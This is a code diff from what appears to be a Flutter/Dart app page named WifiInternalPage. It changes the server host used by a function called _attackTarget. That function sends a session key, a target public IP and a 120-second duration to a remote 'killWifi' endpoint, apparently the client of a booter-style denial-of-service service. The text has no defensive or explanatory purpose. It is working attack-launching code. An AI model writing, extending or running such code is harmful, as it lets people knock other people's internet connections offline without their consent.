@@ -68,7 +68,7 @@ class _WifiInternalPageState extends State<WifiInternalPage> {
   Future<void> _attackTarget() async {
     setState(() => isAttacking = true);
     final url = Uri.parse(
-        "http://darknovaaa.onlinedigitalcloud.biz.id:11198/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
+        "http://official.zhaher.my.id:3299/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
     try {
       final res = await http.get(url);
       if (res.statusCode == 200) {
